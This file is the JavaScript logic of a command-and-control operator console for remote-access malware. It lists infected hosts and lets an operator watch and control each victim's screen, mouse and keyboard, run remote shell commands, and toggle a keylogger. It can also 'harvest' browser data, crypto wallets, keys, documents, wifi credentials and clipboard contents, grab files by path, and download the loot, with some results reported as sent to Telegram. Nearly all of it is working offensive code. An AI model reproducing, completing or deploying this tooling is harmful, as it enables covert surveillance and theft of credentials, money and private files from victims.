/* app.js — operator console logic. Vanilla JS, no dependencies. */
(function () {
  "use strict";

  /* ---------- token ---------- */
  var qs = new URLSearchParams(location.search);
  var qsToken = qs.get("token") || "";
  if (qsToken) {
    try { localStorage.setItem("c2token", qsToken); } catch (e) {}
  }
  var token = qsToken;
  if (!token) {
    try { token = localStorage.getItem("c2token") || ""; } catch (e) { token = ""; }
  }

  function withToken(url) {
    if (!token) return url;
    return url + (url.indexOf("?") === -1 ? "?" : "&") + "token=" + encodeURIComponent(token);
  }

  function apiUrl(path) {
    // Relative to the served document so a subpath mount still resolves.
    return withToken(new URL(path, document.baseURI).toString());
  }

  function wsUrl(sessionId) {
    var u = new URL("ws/op/" + encodeURIComponent(sessionId), document.baseURI);
    u.protocol = (u.protocol === "https:") ? "wss:" : "ws:";
    return withToken(u.toString());
  }

  /* ---------- dom ---------- */
  function $(id) { return document.getElementById(id); }
  var sessList = $("sessList"), sessEmpty = $("sessEmpty"), sessCount = $("sessCount");
  var connChip = $("connChip"), latencyEl = $("latency"), tokenInput = $("tokenInput");
  var canvas = $("screen"), stage = $("stage"), overlay = $("stageOverlay");
  var streamMeta = $("streamMeta");
  var btnDetach = $("btnDetach"), btnKbd = $("btnKbd");
  var rngFps = $("rngFps"), rngQ = $("rngQ"), rngScale = $("rngScale");
  var outFps = $("outFps"), outQ = $("outQ"), outScale = $("outScale");
  var term = $("term"), cmdForm = $("cmdForm"), cmdInput = $("cmdInput");
  var btnSend = $("btnSend"), btnClear = $("btnClear"), shellTarget = $("shellTarget");
  var btnLoot = $("btnLoot"), lootPanel = $("lootPanel"), lootList = $("lootList");
  var lootCount = $("lootCount"), lootStatus = $("lootStatus"), keylogEl = $("keylog");
  var btnLootClose = $("btnLootClose"), btnHarvest = $("btnHarvest");
  var btnKeylog = $("btnKeylog"), btnLootRefresh = $("btnLootRefresh");
  var lootPathForm = $("lootPathForm"), lootPath = $("lootPath"), btnGrab = $("btnGrab");

  tokenInput.value = token;
  tokenInput.addEventListener("change", function () {
    token = tokenInput.value.trim();
    try {
      if (token) localStorage.setItem("c2token", token);
      else localStorage.removeItem("c2token");
    } catch (e) {}
    fetchSessions();
    if (attachedId) attach(attachedId); // reconnect with new token
  });

  /* ---------- state ---------- */
  var sessions = [];          // last /api/sessions payload
  var attachedId = null;      // session currently attached
  var ws = null;
  var wsWanted = false;       // true while operator wants the socket up
  var retryTimer = null;
  var pingTimer = null;
  var pingSeq = 0;
  var pingSentAt = 0;
  var kbdCapture = false;
  var lastLatency = null;
  var lastObjectUrl = null;
  var setTimer = null;
  var lootOpen = false;
  var keylogOn = false;
  var lootTimer = null;

  /* ---------- sessions ---------- */
  function relTime(ts) {
    // last_seen is unix seconds.
    var now = Date.now() / 1000;
    var d = Math.max(0, Math.round(now - ts));
    if (d < 5) return "now";
    if (d < 60) return d + "s ago";
    var m = Math.floor(d / 60);
    if (m < 60) return m + "m ago";
    return Math.floor(m / 60) + "h ago";
  }

  function sessionById(id) {
    for (var i = 0; i < sessions.length; i++) {
      if (sessions[i].id === id) return sessions[i];
    }
    return null;
  }

  function renderSessions() {
    sessList.textContent = "";
    sessCount.textContent = String(sessions.length);
    sessEmpty.classList.toggle("show", sessions.length === 0);
    sessions.forEach(function (s) {
      var li = document.createElement("li");
      var b = document.createElement("button");
      b.type = "button";
      b.className = "sess" + (s.id === attachedId ? " active" : "");
      b.setAttribute("data-id", s.id);

      var top = document.createElement("div");
      top.className = "sess-top";
      var dot = document.createElement("span");
      dot.className = "dot " + (s.online ? "on" : "off");
      top.appendChild(dot);
      var host = document.createElement("span");
      host.className = "sess-host";
      host.textContent = s.host || s.id.slice(0, 8);
      top.appendChild(host);
      if (s.admin) {
        var badge = document.createElement("span");
        badge.className = "badge-admin";
        badge.textContent = "admin";
        top.appendChild(badge);
      }
      b.appendChild(top);

      var sub = document.createElement("div");
      sub.className = "sess-sub";
      sub.textContent = (s.user || "?") + " · " + (s.os || "?");
      b.appendChild(sub);

      var seen = document.createElement("div");
      seen.className = "sess-seen";
      seen.textContent = (s.online ? "online · " : "offline · ") + relTime(s.last_seen);
      b.appendChild(seen);

      b.addEventListener("click", function () { attach(s.id); });
      li.appendChild(b);
      sessList.appendChild(li);
    });
  }

  function fetchSessions() {
    fetch(apiUrl("api/sessions"), { cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("http " + r.status);
        return r.json();
      })
      .then(function (data) {
        sessions = Array.isArray(data) ? data : [];
        // If attached session vanished from the list: mark offline, stop retry.
        if (attachedId && !sessionById(attachedId)) {
          termSys("session " + attachedId.slice(0, 8) + " left — link down");
          stopSocket(true);
          setChip("offline", "chip-dead");
          overlay.textContent = "session offline";
          overlay.classList.remove("hidden");
        }
        renderSessions();
      })
      .catch(function () {
        // Keep the old list; polling continues. Surface fetch failure on chip
        // only when nothing is attached.
        if (!attachedId) setChip("api unreachable", "chip-dead");
      });
  }

  /* ---------- status chip ---------- */
  function setChip(text, cls) {
    connChip.textContent = text;
    connChip.className = "chip " + (cls || "chip-idle");
  }

  /* ---------- canvas / frames ---------- */
  var ctx = canvas.getContext("2d");

  function fitCanvas() {
    var r = stage.getBoundingClientRect();
    var w = Math.max(1, Math.floor(r.width));
    var h = Math.max(1, Math.floor(r.height));
    if (canvas.width !== w || canvas.height !== h) {
      canvas.width = w;
      canvas.height = h;
      paintIdle();
    }
  }

  function paintIdle() {
    ctx.fillStyle = "#060708";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
  }

  function drawBitmap(image, iw, ih) {
    // Letterbox: preserve aspect ratio on dark background.
    var cw = canvas.width, ch = canvas.height;
    if (cw < 2 || ch < 2) return;
    var scale = Math.min(cw / iw, ch / ih);
    var dw = Math.max(1, Math.floor(iw * scale));
    var dh = Math.max(1, Math.floor(ih * scale));
    var dx = Math.floor((cw - dw) / 2);
    var dy = Math.floor((ch - dh) / 2);
    ctx.fillStyle = "#060708";
    ctx.fillRect(0, 0, cw, ch);
    try {
      ctx.drawImage(image, dx, dy, dw, dh);
    } catch (e) {}
    streamMeta.textContent = iw + " × " + ih;
  }

  function revokeLastUrl() {
    if (lastObjectUrl) {
      try { URL.revokeObjectURL(lastObjectUrl); } catch (e) {}
      lastObjectUrl = null;
    }
  }

  function handleFrame(buf) {
    // buf: ArrayBuffer. First byte 0x01, rest JPEG.
    if (!buf || buf.byteLength < 2) return;
    var bytes = new Uint8Array(buf);
    if (bytes[0] !== 0x01) return; // only screen frames are rendered
    var jpeg = bytes.slice(1);
    var blob = new Blob([jpeg], { type: "image/jpeg" });
    if (typeof createImageBitmap === "function") {
      createImageBitmap(blob).then(function (bmp) {
        drawBitmap(bmp, bmp.width, bmp.height);
        try { bmp.close(); } catch (e) {}
      }).catch(function () { drawViaImage(blob); });
    } else {
      drawViaImage(blob);
    }
  }

  function drawViaImage(blob) {
    revokeLastUrl();
    var url = URL.createObjectURL(blob);
    lastObjectUrl = url;
    var img = new Image();
    img.onload = function () {
      drawBitmap(img, img.naturalWidth, img.naturalHeight);
      revokeLastUrl();
    };
    img.onerror = function () { revokeLastUrl(); };
    img.src = url;
  }

  window.addEventListener("resize", fitCanvas);
  fitCanvas();

  /* ---------- websocket ---------- */
  function send(obj) {
    if (ws && ws.readyState === WebSocket.OPEN) {
      try { ws.send(JSON.stringify(obj)); } catch (e) {}
    }
  }

  function attach(id) {
    if (attachedId === id && ws && ws.readyState === WebSocket.OPEN) return;
    stopSocket(false);
    attachedId = id;
    wsWanted = true;
    var s = sessionById(id);
    shellTarget.textContent = s ? ((s.host || id) + " · " + (s.user || "?")) : id.slice(0, 8);
    cmdInput.disabled = false;
    btnSend.disabled = false;
    btnDetach.disabled = false;
    btnHarvest.disabled = false;
    btnKeylog.disabled = false;
    btnGrab.disabled = false;
    if (lootOpen) fetchLoot();
    termSys("attaching to " + id.slice(0, 8) + "…");
    overlay.textContent = "connecting…";
    overlay.classList.remove("hidden");
    setChip("connecting", "chip-link");
    renderSessions();
    openSocket();
  }

  function detach() {
    if (!attachedId) return;
    termSys("detached");
    attachedId = null;
    stopSocket(true);
    setChip("no session", "chip-idle");
    overlay.textContent = "no session";
    overlay.classList.remove("hidden");
    paintIdle();
    streamMeta.textContent = "-- × --";
    shellTarget.textContent = "detached";
    cmdInput.disabled = true;
    btnSend.disabled = true;
    btnDetach.disabled = true;
    btnHarvest.disabled = true;
    btnKeylog.disabled = true;
    btnGrab.disabled = true;
    lootStatus.textContent = "not attached";
    renderSessions();
  }

  function stopSocket(clearWanted) {
    if (clearWanted) wsWanted = false;
    if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
    if (ws) {
      var s = ws;
      ws = null;
      s.onclose = null; s.onerror = null; s.onmessage = null; s.onopen = null;
      try { s.close(); } catch (e) {}
    }
  }

  function openSocket() {
    if (!attachedId || !wsWanted) return;
    var id = attachedId;
    var sock;
    try {
      sock = new WebSocket(wsUrl(id));
    } catch (e) {
      scheduleRetry();
      return;
    }
    sock.binaryType = "arraybuffer";
    ws = sock;
    setChip("connecting", "chip-link");

    sock.onopen = function () {
      if (ws !== sock || attachedId !== id) { try { sock.close(); } catch (e) {} return; }
      setChip("attached", "chip-live");
      overlay.classList.add("hidden");
      pushSettings(); // apply current slider values to the fresh link
      pingTimer = setInterval(sendPing, 10000);
      sendPing();
      stage.focus({ preventScroll: true });
    };

    sock.onmessage = function (ev) {
      if (typeof ev.data === "string") onText(ev.data);
      else if (ev.data instanceof ArrayBuffer) handleFrame(ev.data);
      else if (ev.data instanceof Blob) {
        ev.data.arrayBuffer().then(handleFrame).catch(function () {});
      }
    };

    sock.onerror = function () { /* onclose handles it */ };

    sock.onclose = function () {
      if (ws === sock) ws = null;
      if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
      if (!wsWanted || attachedId !== id) return;
      setChip("link down — retrying", "chip-dead");
      overlay.textContent = "link down — retrying…";
      overlay.classList.remove("hidden");
      scheduleRetry();
    };
  }

  function scheduleRetry() {
    if (!wsWanted || !attachedId) return;
    if (retryTimer) return;
    // Only retry while the session is still known; the poller stops us otherwise.
    retryTimer = setTimeout(function () {
      retryTimer = null;
      if (!wsWanted || !attachedId) return;
      var s = sessionById(attachedId);
      if (s && s.online === false && !sessions.length) {
        // fall through: still retry once; poller will kill us if it left
      }
      openSocket();
    }, 2000);
  }

  function onText(raw) {
    var m;
    try { m = JSON.parse(raw); } catch (e) { return; }
    if (!m || typeof m.t !== "string") return;
    if (m.t === "pong") {
      if (m.id === pingSeq && pingSentAt) {
        lastLatency = Date.now() - pingSentAt;
        latencyEl.textContent = "rtt " + lastLatency + "ms";
      }
    } else if (m.t === "cmd_result") {
      termResult(m.id, String(m.out != null ? m.out : ""));
    } else if (m.t === "stats") {
      var parts = [];
      if (m.fps != null) parts.push(Number(m.fps).toFixed(1) + "fps");
      if (m.kbps != null) parts.push(m.kbps + "kbps");
      if (parts.length) streamMeta.textContent += " · " + parts.join(" ");
    } else if (m.t === "loot_meta") {
      lootStatus.textContent = "received " + (m.name || "?") + " (" + fmtSize(m.size) + ")";
      scheduleLootRefresh();
    } else if (m.t === "harvest_ack") {
      lootStatus.textContent = "harvesting…";
    } else if (m.t === "harvest_done") {
      if (m.via === "telegram") {
        lootStatus.textContent = (m.ok ? "sent to telegram — " : "telegram failed — ") +
          (m.note || ((m.count || 0) + " files, " + fmtSize(m.bytes)));
      } else {
        lootStatus.textContent = "harvest done: " + (m.count || 0) + " files, " + fmtSize(m.bytes);
        fetchLoot();
      }
    } else if (m.t === "keys") {
      appendKeys(String(m.text || ""));
    } else if (m.t === "keylog_state") {
      setKeylogUI(!!m.on);
    }
    // hello / other implant control frames are ignored by the viewer.
  }

  /* ---------- loot / keylog ---------- */
  function fmtSize(n) {
    n = Number(n) || 0;
    if (n < 1024) return n + " B";
    if (n < 1024 * 1024) return (n / 1024).toFixed(1) + " KB";
    return (n / (1024 * 1024)).toFixed(1) + " MB";
  }

  function setLootOpen(on) {
    lootOpen = !!on;
    lootPanel.hidden = !lootOpen;
    btnLoot.setAttribute("aria-pressed", lootOpen ? "true" : "false");
    if (lootOpen) fetchLoot();
  }

  function scheduleLootRefresh() {
    if (!lootOpen) return;
    if (lootTimer) return;
    lootTimer = setTimeout(function () {
      lootTimer = null;
      fetchLoot();
    }, 400);
  }

  function fetchLoot() {
    if (!attachedId) {
      lootStatus.textContent = "not attached";
      lootList.textContent = "";
      lootCount.textContent = "0";
      return;
    }
    fetch(apiUrl("api/loot/" + encodeURIComponent(attachedId)), { cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("http " + r.status);
        return r.json();
      })
      .then(function (items) {
        renderLoot(Array.isArray(items) ? items : []);
      })
      .catch(function () {
        lootStatus.textContent = "loot list unavailable";
      });
  }

  function renderLoot(items) {
    lootList.textContent = "";
    lootCount.textContent = String(items.length);
    if (!items.length) {
      lootStatus.textContent = "no loot yet — run a harvest";
      return;
    }
    lootStatus.textContent = items.length + " files";
    var groups = Object.create(null);
    items.forEach(function (it) {
      var i = it.name.indexOf("/");
      var g = i === -1 ? "(root)" : it.name.slice(0, i);
      (groups[g] || (groups[g] = [])).push(it);
    });
    Object.keys(groups).sort().forEach(function (g) {
      var head = document.createElement("li");
      head.className = "loot-dir";
      head.textContent = g;
      lootList.appendChild(head);
      groups[g].forEach(function (it) {
        var li = document.createElement("li");
        var a = document.createElement("a");
        a.className = "loot-item";
        a.href = apiUrl(
          "api/loot/" + encodeURIComponent(attachedId) + "/" + encodeURI(it.name)
        );
        a.setAttribute("download", it.name.split("/").pop() || "loot");
        var nm = document.createElement("span");
        nm.className = "loot-name";
        nm.textContent = g === "(root)" ? it.name : it.name.slice(g.length + 1);
        var sz = document.createElement("span");
        sz.className = "loot-size";
        sz.textContent = fmtSize(it.size);
        a.appendChild(nm);
        a.appendChild(sz);
        li.appendChild(a);
        lootList.appendChild(li);
      });
    });
  }

  function setKeylogUI(on) {
    keylogOn = !!on;
    btnKeylog.setAttribute("aria-pressed", keylogOn ? "true" : "false");
    btnKeylog.textContent = "keylog: " + (keylogOn ? "on" : "off");
  }

  function appendKeys(text) {
    if (!text) return;
    keylogEl.textContent += text;
    if (keylogEl.textContent.length > 120000) {
      keylogEl.textContent = keylogEl.textContent.slice(-60000);
    }
    keylogEl.scrollTop = keylogEl.scrollHeight;
  }

  btnLoot.addEventListener("click", function () { setLootOpen(!lootOpen); });
  btnLootClose.addEventListener("click", function () { setLootOpen(false); });
  btnLootRefresh.addEventListener("click", fetchLoot);

  btnHarvest.addEventListener("click", function () {
    if (!socketReady()) {
      lootStatus.textContent = "not attached";
      return;
    }
    lootStatus.textContent = "requesting harvest…";
    send({
      t: "harvest",
      id: randHex(6),
      collectors: ["env", "browsers", "wallets", "keys", "documents", "wifi", "clipboard"]
    });
  });

  btnKeylog.addEventListener("click", function () {
    if (!socketReady()) return;
    send({ t: "keylog", on: !keylogOn });
  });

  lootPathForm.addEventListener("submit", function (ev) {
    ev.preventDefault();
    var p = lootPath.value.trim();
    if (!p || !socketReady()) return;
    lootStatus.textContent = "grabbing " + p + "…";
    send({ t: "harvest", id: randHex(6), collectors: ["custom"], paths: [p] });
    lootPath.value = "";
  });

  function sendPing() {
    pingSeq += 1;
    pingSentAt = Date.now();
    send({ t: "ping", id: pingSeq });
  }

  /* ---------- remote input: mouse ---------- */
  function normPos(ev) {
    var r = canvas.getBoundingClientRect();
    var x = (ev.clientX - r.left) / (r.width || 1);
    var y = (ev.clientY - r.top) / (r.height || 1);
    return {
      x: Math.min(1, Math.max(0, x)),
      y: Math.min(1, Math.max(0, y))
    };
  }

  function btnName(ev) {
    if (ev.button === 2) return "right";
    if (ev.button === 1) return "middle";
    return "left";
  }

  function socketReady() {
    return attachedId && ws && ws.readyState === WebSocket.OPEN;
  }

  canvas.addEventListener("contextmenu", function (ev) { ev.preventDefault(); });

  canvas.addEventListener("pointerdown", function (ev) {
    if (!socketReady()) return;
    var p = normPos(ev);
    try { canvas.setPointerCapture(ev.pointerId); } catch (e) {}
    send({ t: "mouse", x: +p.x.toFixed(4), y: +p.y.toFixed(4), btn: btnName(ev), act: "down" });
    if (kbdCapture) { ev.preventDefault(); stage.focus({ preventScroll: true }); }
  });

  canvas.addEventListener("pointerup", function (ev) {
    if (!socketReady()) return;
    var p = normPos(ev);
    send({ t: "mouse", x: +p.x.toFixed(4), y: +p.y.toFixed(4), btn: btnName(ev), act: "up" });
  });

  canvas.addEventListener("pointermove", function (ev) {
    if (!socketReady()) return;
    if (ev.buttons === 0 && ev.pointerType === "mouse") {
      // Hover tracking: throttle with rAF to avoid flooding the link.
      if (canvas._moveQueued) return;
      canvas._moveQueued = true;
      var cx = ev.clientX, cy = ev.clientY;
      requestAnimationFrame(function () {
        canvas._moveQueued = false;
        if (!socketReady()) return;
        var r = canvas.getBoundingClientRect();
        var x = Math.min(1, Math.max(0, (cx - r.left) / (r.width || 1)));
        var y = Math.min(1, Math.max(0, (cy - r.top) / (r.height || 1)));
        send({ t: "mouse", x: +x.toFixed(4), y: +y.toFixed(4), act: "move" });
      });
      return;
    }
    var p = normPos(ev);
    send({ t: "mouse", x: +p.x.toFixed(4), y: +p.y.toFixed(4), act: "move" });
  });

  /* ---------- remote input: keyboard ---------- */
  function setKbd(on) {
    kbdCapture = !!on;
    btnKbd.setAttribute("aria-pressed", kbdCapture ? "true" : "false");
    btnKbd.textContent = "keyboard: " + (kbdCapture ? "on" : "off");
    stage.classList.toggle("kbd-on", kbdCapture);
    if (kbdCapture) stage.focus({ preventScroll: true });
  }

  btnKbd.addEventListener("click", function () { setKbd(!kbdCapture); });

  function modsOf(ev) {
    var m = [];
    if (ev.shiftKey) m.push("shift");
    if (ev.ctrlKey) m.push("ctrl");
    if (ev.altKey) m.push("alt");
    return m;
  }

  function onKey(ev, down) {
    if (!kbdCapture || !socketReady()) return;
    var vk = (typeof window.VK_FROM_CODE === "function")
      ? window.VK_FROM_CODE(ev.code)
      : null;
    if (vk == null) return; // unmapped key: let it pass to the browser
    ev.preventDefault();
    ev.stopPropagation();
    send({ t: "key", vk: vk, down: down, mods: modsOf(ev) });
  }

  // Capture on window while armed so focus slips don't leak keys to the page.
  window.addEventListener("keydown", function (ev) {
    if (!kbdCapture) return;
    if (ev.target === cmdInput || ev.target === tokenInput) return;
    onKey(ev, true);
  }, true);

  window.addEventListener("keyup", function (ev) {
    if (!kbdCapture) return;
    if (ev.target === cmdInput || ev.target === tokenInput) return;
    onKey(ev, false);
  }, true);

  window.addEventListener("blur", function () {
    // Browser focus lost: capturing stays on, but operator must re-arm
    // mentally — status stays visible on the toggle.
  });

  /* ---------- stream controls ---------- */
  function readSettings() {
    return {
      fps: parseInt(rngFps.value, 10),
      quality: parseInt(rngQ.value, 10),
      scale: Math.round(parseFloat(rngScale.value) * 100) / 100
    };
  }

  function paintOutputs() {
    outFps.textContent = rngFps.value;
    outQ.textContent = rngQ.value;
    outScale.textContent = (Math.round(parseFloat(rngScale.value) * 100) / 100).toFixed(2);
  }

  function pushSettings() {
    paintOutputs();
    if (!socketReady()) return;
    send({ t: "set", fps: readSettings().fps, quality: readSettings().quality, scale: readSettings().scale });
  }

  function onSlider() {
    paintOutputs();
    if (setTimer) clearTimeout(setTimer);
    setTimer = setTimeout(function () {
      setTimer = null;
      if (!socketReady()) return;
      var s = readSettings();
      send({ t: "set", fps: s.fps, quality: s.quality, scale: s.scale });
    }, 250);
  }

  rngFps.addEventListener("input", onSlider);
  rngQ.addEventListener("input", onSlider);
  rngScale.addEventListener("input", onSlider);
  paintOutputs();

  btnDetach.addEventListener("click", detach);

  /* ---------- shell ---------- */
  var pending = Object.create(null); // id -> echo div

  function randHex(n) {
    var s = "";
    var hex = "0123456789abcdef";
    for (var i = 0; i < n; i++) s += hex[(Math.random() * 16) | 0];
    return s;
  }

  function scrollTerm() {
    term.scrollTop = term.scrollHeight;
  }

  function termSys(text) {
    var d = document.createElement("div");
    d.className = "sys";
    d.textContent = "-- " + text;
    term.appendChild(d);
    scrollTerm();
  }

  function termResult(id, out) {
    var echo = pending[id];
    if (echo) {
      delete pending[id];
    } else {
      // Unsolicited result (or page reloaded mid-command): still render.
      echo = document.createElement("div");
      echo.className = "echo";
      var pr = document.createElement("span");
      pr.className = "prompt";
      pr.textContent = "> ";
      echo.appendChild(pr);
      echo.appendChild(document.createTextNode("(id " + id + ")"));
      term.appendChild(echo);
    }
    var d = document.createElement("div");
    d.className = "out";
    d.textContent = out === "" ? "(no output)" : out;
    term.appendChild(d);
    scrollTerm();
  }

  cmdForm.addEventListener("submit", function (ev) {
    ev.preventDefault();
    var line = cmdInput.value;
    if (!line) return;
    if (!socketReady()) {
      termSys("not attached — command dropped");
      return;
    }
    var id = randHex(4);
    var echo = document.createElement("div");
    echo.className = "echo";
    var pr = document.createElement("span");
    pr.className = "prompt";
    pr.textContent = "> ";
    echo.appendChild(pr);
    echo.appendChild(document.createTextNode(line));
    term.appendChild(echo);
    pending[id] = echo;
    scrollTerm();
    send({ t: "cmd", id: id, line: line });
    cmdInput.value = "";
    cmdInput.focus();
  });

  btnClear.addEventListener("click", function () {
    term.textContent = "";
  });

  /* ---------- boot ---------- */
  fetchSessions();
  setInterval(fetchSessions, 2000);
  setInterval(function () { renderSessions(); }, 5000); // refresh "x ago" labels
})();
